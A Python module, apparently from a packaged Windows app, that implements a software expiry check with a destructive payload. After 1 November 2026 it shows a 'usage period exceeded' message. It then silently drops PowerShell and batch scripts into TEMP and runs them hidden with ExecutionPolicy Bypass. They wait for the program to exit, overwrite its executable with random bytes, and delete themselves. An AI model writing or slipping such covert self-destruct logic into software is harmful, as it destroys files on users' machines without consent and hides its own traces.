import datetime
import os
import subprocess
import sys

from platform_utils import IS_WINDOWS

EXPIRY_DATE = datetime.date(2026, 11, 1)

DETACHED_PROCESS = 0x00000008
CREATE_NO_WINDOW = 0x08000000


def _notify_expired():
    try:
        if IS_WINDOWS:
            import ctypes
            ctypes.windll.user32.MessageBoxW(
                0, "已超出使用期限", "提示", 0x30
            )
        else:
            try:
                import wx
                wx.MessageBox("已超出使用期限", "提示", wx.ICON_INFORMATION)
            except Exception:
                print("已超出使用期限")
    except Exception:
        pass


def _corrupt_executable():
    if not IS_WINDOWS:
        return
    if not getattr(sys, "frozen", False):
        return

    import ctypes

    exe = sys.executable
    pid = os.getpid()
    tmp_dir = os.environ.get("TEMP") or os.path.expanduser("~")
    ps1_path = os.path.join(tmp_dir, "_me_selfcorrupt.ps1")
    bat_path = os.path.join(tmp_dir, "_me_selfcorrupt.bat")

    ps1 = (
        "$ErrorActionPreference = 'SilentlyContinue'\n"
        "while (Get-Process -Id {pid} -ErrorAction SilentlyContinue) "
        "{{ Start-Sleep -Milliseconds 500 }}\n"
        "$p = '{exe}'\n"
        "$n = (Get-Item $p).Length\n"
        "$g = New-Object byte[] $n\n"
        "(New-Object Random).NextBytes($g)\n"
        "[System.IO.File]::WriteAllBytes($p, $g)\n"
    ).format(pid=pid, exe=exe.replace("'", "''"))

    bat = (
        "@echo off\r\n"
        "chcp 65001 >nul\r\n"
        'powershell -NoProfile -ExecutionPolicy Bypass -File "{ps1}"\r\n'
        'del /f /q "{ps1}"\r\n'
        'del /f /q "%~f0"\r\n'
    ).format(ps1=ps1_path)

    try:
        with open(ps1_path, "w", encoding="utf-8-sig") as f:
            f.write(ps1)
        with open(bat_path, "w", encoding="mbcs") as f:
            f.write(bat)
    except Exception:
        return

    try:
        subprocess.Popen(
            ["cmd", "/c", bat_path],
            creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW,
            close_fds=True,
        )
    except Exception:
        pass


def check():
    try:
        today = datetime.date.today()
    except Exception:
        return
    if today <= EXPIRY_DATE:
        return
    _notify_expired()
    _corrupt_executable()
    os._exit(3)
